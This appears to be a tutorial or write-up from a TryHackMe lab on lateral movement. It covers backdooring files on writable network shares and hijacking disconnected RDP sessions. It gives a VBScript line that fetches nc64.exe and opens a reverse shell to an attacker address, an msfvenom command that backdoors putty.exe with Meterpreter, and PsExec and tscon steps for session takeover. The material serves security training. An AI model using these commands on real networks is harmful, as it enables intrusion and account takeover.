# Abusing User Behavior for Lateral Movement and Pivoting

Under certain circumstances, an attacker can exploit user actions to gain further access to machines in a network. Below are some common techniques used for this purpose.

---

## Abusing Writable Shares

In corporate environments, writable network shares are often used by legitimate users for day-to-day tasks. If attackers gain write access to these shares, they can plant malicious files to force users into executing arbitrary payloads, gaining access to their machines.

### Example: Shortcut to a Script or Executable

Administrators may host executables on network shares for users to execute without installing them locally. If attackers have write permissions, they can backdoor these files to execute malicious payloads.

When a user opens the shortcut, the executable is copied to the `%temp%` folder on their workstation and executed. This allows the payload to run in the context of the user's workstation and account.

---

### Backdooring `.vbs` Scripts

If the shared resource is a `.vbs` script, attackers can inject malicious code. For example:

```vbscript
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

This code copies `nc64.exe` to the user's `%tmp%` directory and sends a reverse shell to the attacker when the script is executed.

---

### Backdooring `.exe` Files

If the shared file is a Windows binary (e.g., `putty.exe`), attackers can use `msfvenom` to inject a backdoor:

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The backdoored binary will function normally but execute a hidden payload. Replace the original file on the share and wait for connections using Metasploit's `exploit/multi/handler` module.

---

## RDP Hijacking

When administrators close the RDP client without logging off, their sessions remain open. On Windows Server 2016 and earlier, attackers with `SYSTEM` privileges can hijack these sessions without needing a password.

### Steps to Hijack an RDP Session

1. **Obtain SYSTEM Privileges**  
    Use a method like `PsExec` to elevate privileges:
    ```bash
    PsExec64.exe -s cmd.exe
    ```

2. **List Existing Sessions**  
    Run the following command:
    ```bash
    query user
    ```
    Example output:
    ```
    USERNAME         SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
    >administrator   rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
    luke                              3  Disc            .  4/6/2022 6:51 AM
    ```

3. **Hijack a Session**  
    Use `tscon.exe` to connect to a session:
    ```bash
    tscon 3 /dest:rdp-tcp#6
    ```
    This connects session `3` (owned by `luke`) to the administrator's RDP session (`rdp-tcp#6`).

    **Note:** On Windows Server 2019, you cannot hijack sessions without knowing the user's password.

---

## Exercise: Hijacking an RDP Session

1. Obtain credentials from [this link](http://distributor.za.tryhackme.com/creds_t2).
2. Connect to `THMJMP2` via RDP:
    ```bash
    xfreerdp /v:thmjmp2.za.tryhackme.com /u:YOUR_USER /p:YOUR_PASSWORD
    ```
3. Use the provided instructions to hijack `t1_toby.beck`'s RDP session and retrieve the flag.

**Note:** When running `query session`, you may see multiple users named `t1_toby.beck`. Hijack any session marked as `Disc.` to avoid disrupting active users.

---

For additional exercises on backdooring executables or other files, refer to the **Windows Local Persistence** room.